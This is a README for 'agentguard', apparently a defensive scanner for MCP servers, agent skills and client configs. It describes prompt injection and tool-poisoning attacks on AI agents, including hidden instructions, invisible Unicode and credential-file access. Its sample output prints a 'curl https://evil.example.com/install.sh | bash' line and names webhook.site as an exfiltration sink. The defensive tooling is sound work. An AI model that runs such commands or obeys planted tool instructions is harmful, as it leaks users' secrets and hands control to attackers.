# agentguard

**Security scanner for AI agents — think `npm audit` for the agent stack.**

Your agent's tools are code execution with the model's judgment as the only sandbox.
`agentguard` scans what your agent actually runs — **MCP servers, agent skills, and client configs** — for the attacks that are already hitting real users:

- 🎣 **Tool poisoning** — instructions hidden in tool descriptions that your agent obeys but you never see
- 🎭 **Rug pulls** — a server you approved silently changing its tool descriptions later
- 🥷 **Invisible Unicode** — zero-width / tag-block characters that smuggle model-readable text past human review
- 🔑 **Credential theft** — servers and skills pointing agents at `~/.ssh/id_rsa`, `.aws/credentials`, `.env`
- 📡 **Exfiltration channels** — data-sink endpoints, markdown image beacons, base64 covert channels
- 💉 **Prompt injection in skills** — `AGENTS.md` / `SKILL.md` / cursor rules that suppress confirmations or redirect your agent
- 📦 **Supply chain** — unpinned `npx` packages, typosquats, `curl | bash` installers, hardcoded secrets

Zero dependencies. One command:

```bash
npx agentguard scan
```

## Why

In March 2026, an audit of 17 popular MCP servers found **100% shipped without any permission declaration**. Academic evaluation of existing MCP scanners (arXiv:2509.24272) measured detection rates of **~0.10/1.0** across 12 attack classes. Meanwhile the attacks are real: tool poisoning, rug pulls, and prompt injection via agent config files have all been demonstrated against mainstream clients.

`agentguard` is built to close that gap — and to prove it with a public benchmark, not marketing claims.

## Quick start

```bash
# Scan every MCP config on this machine (Claude Desktop/Code, Cursor, VS Code, Windsurf, Zed…)
# plus AGENTS.md / SKILL.md / cursor rules in the current project
npx agentguard scan

# Audit a cloned MCP server before installing it
npx agentguard scan --path ./some-mcp-server

# Inspect live tool definitions (spawns servers, like your client does)
npx agentguard scan --probe

# Pin tool descriptions, then detect rug pulls in CI
npx agentguard lock
npx agentguard verify

# GitHub code scanning integration
npx agentguard scan --format sarif --fail-on high > agentguard.sarif
```

Exit code is non-zero when findings meet the threshold (default: any high/critical), so it drops straight into CI.

## What a scan looks like

```
weather [C] (cursor) npx -y totally-safe-weather-mcp
  MED  Hardcoded credential "WEATHER_API_KEY" in config [AG-C003]
  MED  Server "weather" runs an unpinned package [AG-C005]

helper [C] (cursor) sh -c curl https://evil.example.com/install.sh | bash
  HIGH Config pipes a remote script into a shell [AG-C004]
       The remote side can change the payload at any time — a rug pull by design.

Skill / instruction files
  CRIT Skill instructs the agent to send data externally [AG-K003]
       AGENTS.md:6 — references a known data-sink service (webhook.site)
  HIGH Malicious instruction hidden in an HTML comment [AG-K004]
       Invisible when the markdown is rendered; fully readable by the model.
```

## Detection coverage

| Layer | Rules | What it catches |
|---|---|---|
| Tool descriptions | AG-T001–T005 | Embedded agent instructions, invisible Unicode, sensitive-file access, exfiltration channels, combined tool-poisoning patterns |
| Client configs | AG-C001–C006 | Plain-HTTP endpoints, missing auth, hardcoded secrets, `curl\|bash`, unpinned packages, typosquats |
| Server source (JS/TS/Python) | AG-S001–S005 | `eval`/shell injection surfaces, credential file reads, env-to-network exfiltration, obfuscation, committed keys |
| Skill / instruction files | AG-K001–K006 | Prompt injection, confirmation suppression, exfiltration instructions, hidden HTML comments, invisible Unicode, credential access |
| Cross-server | AG-X001 | Tool-name shadowing across servers |
| Lockfile | AG-L001–L003 | Description drift (rug pull), schema drift, tools added/removed |

`agentguard` also derives an **observed-capability manifest** per server (network hosts, env vars, file paths, shell use) from source — the permission declaration that servers should have shipped with.

## Benchmark

We maintain a public corpus of attack samples (`benchmark/corpus/`) covering the 12 attack classes from arXiv:2509.24272 plus community-disclosed incidents, and score ourselves on every commit:

<!-- BENCHMARK_RESULTS_START -->
| Metric | agentguard | Academic baseline* |
|---|---|---|
| Malicious sample detection | **40/40 (100%)** | ~0.10/1.0 across 12 attack classes |
| Benign false-positive rate | **0/10 (0%)** | — |

\* mcp-scan and AI-Infra-Guard as measured by Zhao et al., arXiv:2509.24272. Our corpus is self-hosted and weighted toward the rules we ship — treat it as a regression gate, not an independent eval. Full per-sample breakdown: [`benchmark/RESULTS.md`](benchmark/RESULTS.md).
<!-- BENCHMARK_RESULTS_END -->

The corpus is the product: if you disclose a new MCP/agent attack technique, add a sample and we'll cut a rule for it.

## CI

```yaml
# .github/workflows/agentguard.yml  (or run `agentguard init`)
name: agentguard
on: [push, pull_request]
permissions:
  security-events: write
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npx agentguard scan --path . --format sarif --fail-on high > agentguard.sarif
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: agentguard.sarif
```

For rug-pull protection, commit `agentguard.lock.json` and run `npx agentguard verify --fail-on medium` in CI.

## Rules

`agentguard rules` lists every detection rule with its rationale. Every finding includes evidence and a concrete fix — a scanner that only says "bad" is a scanner nobody runs twice.

## Roadmap

- [ ] Runtime policy enforcement (proxy mode: block/allow tool calls by manifest)
- [ ] Permission-manifest standard: generate, diff, and enforce per-server capabilities
- [ ] `agentguard audit <package>` — pre-install audit of any npm/PyPI MCP server (deep tarball scan)
- [ ] Community rule packs + signed rule updates
- [ ] VS Code / Cursor extension surfacing findings at install time

## Contributing

The highest-leverage contribution is **attack samples**: see `benchmark/README.md`. Rules are deliberately easy to write — each is a single function in `src/rules/` with tests in `tests/rules.test.ts`.

## License

MIT — scan everything, own your agent's supply chain.
